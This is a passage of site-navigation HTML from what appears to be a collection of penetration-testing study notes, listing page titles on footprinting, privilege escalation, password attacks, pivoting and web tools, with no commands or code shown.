href=../../../footprinting/dns/ class=md-nav__link> <span class=md-ellipsis> DNS </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/smtp/ class=md-nav__link> <span class=md-ellipsis> SMTP </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/imap_pop3/ class=md-nav__link> <span class=md-ellipsis> IMAP/POP3 </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/snmp/ class=md-nav__link> <span class=md-ellipsis> SNMP </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/mysql/ class=md-nav__link> <span class=md-ellipsis> MySQL </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/mssql/ class=md-nav__link> <span class=md-ellipsis> MSSQL </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/ipmi/ class=md-nav__link> <span class=md-ellipsis> IPMI </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_2_3 type=checkbox id=__nav_4_3_2_3> <label class=md-nav__link for=__nav_4_3_2_3> <span class=md-ellipsis> Remote Management Protocols </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_4_3_2_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../footprinting/linux_remote_management_protocol/ class=md-nav__link> <span class=md-ellipsis> Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../footprinting/windows_remote_management_protocol/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_3 type=checkbox id=__nav_4_3_3> <label class=md-nav__link for=__nav_4_3_3> <span class=md-ellipsis> Attacking Common Services </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking Common Services" data-md-level=3> <label class=md-nav__title for=__nav_4_3_3> <span class="md-nav__icon md-icon"></span> Attacking Common Services </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../attacking_common_services/interacting/ class=md-nav__link> <span class=md-ellipsis> Interacting </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_ftp/ class=md-nav__link> <span class=md-ellipsis> FTP </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_smb/ class=md-nav__link> <span class=md-ellipsis> SMB </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_sql/ class=md-nav__link> <span class=md-ellipsis> SQL Databases </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_rdp/ class=md-nav__link> <span class=md-ellipsis> RDP </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_dns/ class=md-nav__link> <span class=md-ellipsis> DNS </span> </a> </li> <li class=md-nav__item> <a href=../../../attacking_common_services/attacking_email_services/ class=md-nav__link> <span class=md-ellipsis> Email Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4 type=checkbox id=__nav_4_3_4> <label class=md-nav__link for=__nav_4_3_4> <span class=md-ellipsis> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_4_3_4> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1 type=checkbox id=__nav_4_3_4_1> <label class=md-nav__link for=__nav_4_3_4_1> <span class=md-ellipsis> Windows </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Windows data-md-level=4> <label class=md-nav__title for=__nav_4_3_4_1> <span class="md-nav__icon md-icon"></span> Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_1 type=checkbox id=__nav_4_3_4_1_1> <label class=md-nav__link for=__nav_4_3_4_1_1> <span class=md-ellipsis> Getting the Lay of the Land </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_1> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/gtlotl/ class=md-nav__link> <span class=md-ellipsis> Situational Awareness </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/init_enum/ class=md-nav__link> <span class=md-ellipsis> Initial Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/comm_with_ps/ class=md-nav__link> <span class=md-ellipsis> Communication with Processes </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_2 type=checkbox id=__nav_4_3_4_1_2> <label class=md-nav__link for=__nav_4_3_4_1_2> <span class=md-ellipsis> Windows User Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_2> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/seimpersonate_seassignprimarytoken/ class=md-nav__link> <span class=md-ellipsis> SeImpersonate and SeAssignPrimaryToken </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/sebugpriv/ class=md-nav__link> <span class=md-ellipsis> SeDebugPrivilege </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/setakeownershippriv/ class=md-nav__link> <span class=md-ellipsis> SeTakeOwnershipPrivilege </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_3 type=checkbox id=__nav_4_3_4_1_3> <label class=md-nav__link for=__nav_4_3_4_1_3> <span class=md-ellipsis> Windows Group Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_3> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/builtin_groups/ class=md-nav__link> <span class=md-ellipsis> Windows Built-in Groups </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/eventlog_readers/ class=md-nav__link> <span class=md-ellipsis> Event Log Readers </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/dnsadmins/ class=md-nav__link> <span class=md-ellipsis> DnsAdmins </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/hyperv_admins/ class=md-nav__link> <span class=md-ellipsis> Hyper-V Administrators </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/print_operators/ class=md-nav__link> <span class=md-ellipsis> Print Operators </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/server_operators/ class=md-nav__link> <span class=md-ellipsis> Server Operators </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_4 type=checkbox id=__nav_4_3_4_1_4> <label class=md-nav__link for=__nav_4_3_4_1_4> <span class=md-ellipsis> Attacking the OS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_4> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/user_account_control/ class=md-nav__link> <span class=md-ellipsis> User Account Control </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/weak_permissions/ class=md-nav__link> <span class=md-ellipsis> Weak Permissions </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/vulnerable_services/ class=md-nav__link> <span class=md-ellipsis> Vulnerable Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_5 type=checkbox id=__nav_4_3_4_1_5> <label class=md-nav__link for=__nav_4_3_4_1_5> <span class=md-ellipsis> Credential Theft </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_5> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/other_files/ class=md-nav__link> <span class=md-ellipsis> Other Files </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/further_credential_theft/ class=md-nav__link> <span class=md-ellipsis> Further Credential Theft </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_1_6 type=checkbox id=__nav_4_3_4_1_6> <label class=md-nav__link for=__nav_4_3_4_1_6> <span class=md-ellipsis> Additional Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_1_6> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/windows/interacting_with_users/ class=md-nav__link> <span class=md-ellipsis> Interacting with Users </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/windows/miscellaneous_techniques/ class=md-nav__link> <span class=md-ellipsis> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_2 type=checkbox id=__nav_4_3_4_2> <label class=md-nav__link for=__nav_4_3_4_2> <span class=md-ellipsis> Linux </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Linux data-md-level=4> <label class=md-nav__title for=__nav_4_3_4_2> <span class="md-nav__icon md-icon"></span> Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/linux/enumeration/ class=md-nav__link> <span class=md-ellipsis> Enumeration </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_4_2_2 type=checkbox id=__nav_4_3_4_2_2> <label class=md-nav__link for=__nav_4_3_4_2_2> <span class=md-ellipsis> Local Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Local Techniques" data-md-level=5> <label class=md-nav__title for=__nav_4_3_4_2_2> <span class="md-nav__icon md-icon"></span> Local Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../privesc/linux/kernel_exploits/ class=md-nav__link> <span class=md-ellipsis> Kernel Exploits </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/vulnerable_services/ class=md-nav__link> <span class=md-ellipsis> Vulnerable Services </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/cron_jobs/ class=md-nav__link> <span class=md-ellipsis> Cron Jobs </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/special_permissions/ class=md-nav__link> <span class=md-ellipsis> Special Permissions </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/sudo_rights_abuse/ class=md-nav__link> <span class=md-ellipsis> Sudo Rights Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/path_abuse/ class=md-nav__link> <span class=md-ellipsis> Path Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/wilcard_abuse/ class=md-nav__link> <span class=md-ellipsis> Wildcard Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/shared_libraries/ class=md-nav__link> <span class=md-ellipsis> Shared Libraries </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/shared_object_hijacking/ class=md-nav__link> <span class=md-ellipsis> Shared Object Hijacking </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/privileged_groups/ class=md-nav__link> <span class=md-ellipsis> Privileged Groups </span> </a> </li> <li class=md-nav__item> <a href=../../../privesc/linux/misc_techniques/ class=md-nav__link> <span class=md-ellipsis> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_5 type=checkbox id=__nav_4_3_5> <label class=md-nav__link for=__nav_4_3_5> <span class=md-ellipsis> File Transfers </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_4_3_5> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_5_1 type=checkbox id=__nav_4_3_5_1> <label class=md-nav__link for=__nav_4_3_5_1> <span class=md-ellipsis> File Tranfer Methods </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Tranfer Methods" data-md-level=4> <label class=md-nav__title for=__nav_4_3_5_1> <span class="md-nav__icon md-icon"></span> File Tranfer Methods </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../file_transfers/windows_file_transfer_methods/ class=md-nav__link> <span class=md-ellipsis> Windows </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/linux_file_transfer_methods/ class=md-nav__link> <span class=md-ellipsis> Linux </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/transfering_files_w_code/ class=md-nav__link> <span class=md-ellipsis> Transfering Files with Code </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/miscellaneous_file_transfer_methods/ class=md-nav__link> <span class=md-ellipsis> Miscellaneous </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/protected_file_transfers/ class=md-nav__link> <span class=md-ellipsis> Protected File Transfers </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/catching_files_over_https/ class=md-nav__link> <span class=md-ellipsis> Catching Files over HTTP/S </span> </a> </li> <li class=md-nav__item> <a href=../../../file_transfers/living_off_the_land/ class=md-nav__link> <span class=md-ellipsis> LOTL </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6 type=checkbox id=__nav_4_3_6> <label class=md-nav__link for=__nav_4_3_6> <span class=md-ellipsis> Tools </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_4_3_6> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/nmap/ class=md-nav__link> <span class=md-ellipsis> Nmap </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6_2 type=checkbox id=__nav_4_3_6_2> <label class=md-nav__link for=__nav_4_3_6_2> <span class=md-ellipsis> MSF </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MSF data-md-level=4> <label class=md-nav__title for=__nav_4_3_6_2> <span class="md-nav__icon md-icon"></span> MSF </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6_2_1 type=checkbox id=__nav_4_3_6_2_1> <label class=md-nav__link for=__nav_4_3_6_2_1> <span class=md-ellipsis> Components </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Components data-md-level=5> <label class=md-nav__title for=__nav_4_3_6_2_1> <span class="md-nav__icon md-icon"></span> Components </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/msf/components/msf_modules/ class=md-nav__link> <span class=md-ellipsis> Modules </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/msf/components/msf_targets/ class=md-nav__link> <span class=md-ellipsis> Targets </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/msf/components/msf_payloads/ class=md-nav__link> <span class=md-ellipsis> Payloads </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_6_2_2 type=checkbox id=__nav_4_3_6_2_2> <label class=md-nav__link for=__nav_4_3_6_2_2> <span class=md-ellipsis> Sessions </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Sessions data-md-level=5> <label class=md-nav__title for=__nav_4_3_6_2_2> <span class="md-nav__icon md-icon"></span> Sessions </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/msf/sessions/msf_sessions_jobs/ class=md-nav__link> <span class=md-ellipsis> Sessions & Jobs </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/msf/sessions/msf_sessions_meterpreter/ class=md-nav__link> <span class=md-ellipsis> Meterpreter </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tools/msf/additional_features/evasion/ class=md-nav__link> <span class=md-ellipsis> Evasion </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7 type=checkbox id=__nav_4_3_7> <label class=md-nav__link for=__nav_4_3_7> <span class=md-ellipsis> Password Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Password Attacks" data-md-level=3> <label class=md-nav__title for=__nav_4_3_7> <span class="md-nav__icon md-icon"></span> Password Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_1 type=checkbox id=__nav_4_3_7_1> <label class=md-nav__link for=__nav_4_3_7_1> <span class=md-ellipsis> Remote Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Attacks" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_1> <span class="md-nav__icon md-icon"></span> Remote Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/remote_password_attacks/network_services/ class=md-nav__link> <span class=md-ellipsis> Network Services </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/remote_password_attacks/password_mutations/ class=md-nav__link> <span class=md-ellipsis> Password Mutations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_2 type=checkbox id=__nav_4_3_7_2> <label class=md-nav__link for=__nav_4_3_7_2> <span class=md-ellipsis> Windows Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Local Attacks" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_2> <span class="md-nav__icon md-icon"></span> Windows Local Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/attacking_sam/ class=md-nav__link> <span class=md-ellipsis> Attacking Sam </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/attacking_lsass/ class=md-nav__link> <span class=md-ellipsis> Attacking LSASS </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/attacking_ad_ntdsdit/ class=md-nav__link> <span class=md-ellipsis> Attacking AD & NTDS.dit </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/windows_local_password_attacks/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_3 type=checkbox id=__nav_4_3_7_3> <label class=md-nav__link for=__nav_4_3_7_3> <span class=md-ellipsis> Linux Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Local Attacks" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_3> <span class="md-nav__icon md-icon"></span> Linux Local Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/linux_local_password_attacks/credential_hunting/ class=md-nav__link> <span class=md-ellipsis> Credential Hunting </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/linux_local_password_attacks/passwd_shadow_opasswd/ class=md-nav__link> <span class=md-ellipsis> Passwd, Shadow, Opasswd </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_7_4 type=checkbox id=__nav_4_3_7_4> <label class=md-nav__link for=__nav_4_3_7_4> <span class=md-ellipsis> Cracking Files </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Cracking Files" data-md-level=4> <label class=md-nav__title for=__nav_4_3_7_4> <span class="md-nav__icon md-icon"></span> Cracking Files </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../password_attacks/cracking_files/protected_files/ class=md-nav__link> <span class=md-ellipsis> Protected Files </span> </a> </li> <li class=md-nav__item> <a href=../../../password_attacks/cracking_files/protected_archives/ class=md-nav__link> <span class=md-ellipsis> Protected Archives </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_8 type=checkbox id=__nav_4_3_8> <label class=md-nav__link for=__nav_4_3_8> <span class=md-ellipsis> Pivoting, Tunneling, Port Forwarding </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Pivoting, Tunneling, Port Forwarding" data-md-level=3> <label class=md-nav__title for=__nav_4_3_8> <span class="md-nav__icon md-icon"></span> Pivoting, Tunneling, Port Forwarding </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ptpf/dynamic_port_forwarding_ssh/ class=md-nav__link> <span class=md-ellipsis> Dynamic Port Forwarding w/ SSH and SOCKS Tunneling </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/remote_reverse_port_forwarding_ssh/ class=md-nav__link> <span class=md-ellipsis> Remote/Reverse Port Forwarding w/ SSH </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/meterpreter_tunneling_and_port_forwarding/ class=md-nav__link> <span class=md-ellipsis> Meterpreter Tunneling & Port Forwarding </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_8_4 type=checkbox id=__nav_4_3_8_4> <label class=md-nav__link for=__nav_4_3_8_4> <span class=md-ellipsis> Socat </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Socat data-md-level=4> <label class=md-nav__title for=__nav_4_3_8_4> <span class="md-nav__icon md-icon"></span> Socat </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ptpf/socat/socat_reverse_shell/ class=md-nav__link> <span class=md-ellipsis> Reverse Shell </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/socat/socat_bind_shell/ class=md-nav__link> <span class=md-ellipsis> Bind Shell </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/ssh_for_win_plink/ class=md-nav__link> <span class=md-ellipsis> SSH for Windows: plink </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/ssh_pivoting_sshuttle/ class=md-nav__link> <span class=md-ellipsis> SSH Pivoting w/ Sshuttle </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/webserver_pivoting_rpivot/ class=md-nav__link> <span class=md-ellipsis> WebServer Pivoting w/ Rpivot </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/obstacles/port_forwarding_windows_netsh/ class=md-nav__link> <span class=md-ellipsis> Port Forwarding Windows: Netsh </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/dns_tunneling_dnscat2/ class=md-nav__link> <span class=md-ellipsis> DNS Tunneling w/ Dnscat2 </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/socks5_tunneling_chisel/ class=md-nav__link> <span class=md-ellipsis> SOCKS5 Tunneling with Chisel </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/icmp_tunneling_socks/ class=md-nav__link> <span class=md-ellipsis> ICMP Tunneling with SOCKS </span> </a> </li> <li class=md-nav__item> <a href=../../../ptpf/rdp_socks_tunneling_socksoverrdp/ class=md-nav__link> <span class=md-ellipsis> RDP and SOCKS Tunneling w/ SocksOverRDP </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9 type=checkbox id=__nav_4_3_9> <label class=md-nav__link for=__nav_4_3_9> <span class=md-ellipsis> Web </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=3> <label class=md-nav__title for=__nav_4_3_9> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_1 type=checkbox id=__nav_4_3_9_1> <label class=md-nav__link for=__nav_4_3_9_1> <span class=md-ellipsis> Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Information Gathering" data-md-level=4> <label class=md-nav__title for=__nav_4_3_9_1> <span class="md-nav__icon md-icon"></span> Information Gathering </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_1_1 type=checkbox id=__nav_4_3_9_1_1> <label class=md-nav__link for=__nav_4_3_9_1_1> <span class=md-ellipsis> Passive Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Passive Information Gathering" data-md-level=5> <label class=md-nav__title for=__nav_4_3_9_1_1> <span class="md-nav__icon md-icon"></span> Passive Information Gathering </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/whois/ class=md-nav__link> <span class=md-ellipsis> WHOIS </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/dns/ class=md-nav__link> <span class=md-ellipsis> DNS </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/passive_subdomain_enum/ class=md-nav__link> <span class=md-ellipsis> Subdomain Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/passive_info_gathering/passive_infrastructure_identification/ class=md-nav__link> <span class=md-ellipsis> Infrastructure Identification </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_1_2 type=checkbox id=__nav_4_3_9_1_2> <label class=md-nav__link for=__nav_4_3_9_1_2> <span class=md-ellipsis> Active Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Active Information Gathering" data-md-level=5> <label class=md-nav__title for=__nav_4_3_9_1_2> <span class="md-nav__icon md-icon"></span> Active Information Gathering </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/active_infrastructure_identification/ class=md-nav__link> <span class=md-ellipsis> Infrastructure Identification </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/active_subdomain_enumeration/ class=md-nav__link> <span class=md-ellipsis> Subdomain Enumeration </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/virtual_hosts/ class=md-nav__link> <span class=md-ellipsis> Virtual Hosts </span> </a> </li> <li class=md-nav__item> <a href=../../../web/info_gathering/active_info_gathering/crawling/ class=md-nav__link> <span class=md-ellipsis> Crawling </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tools/ffuf/ class=md-nav__link> <span class=md-ellipsis> Ffuf </span> </a> </li> <li class=md-nav__item> <a href=../../../tools/hydra/ class=md-nav__link> <span class=md-ellipsis> Hydra </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3_9_4 type=checkbox id=__nav_4_3_9_4> <label class=md-nav__link for=__nav_4_3_9_4> <span class=md-ellipsis> SQLMap </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SQLMap data-md-level=4> <label class=md-nav__title for=__nav_4_3_9_4> <span class="md-nav__icon md-icon"></span> SQLMap </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tools/sqlmap/build_attacks/ class=md-nav__link> <span 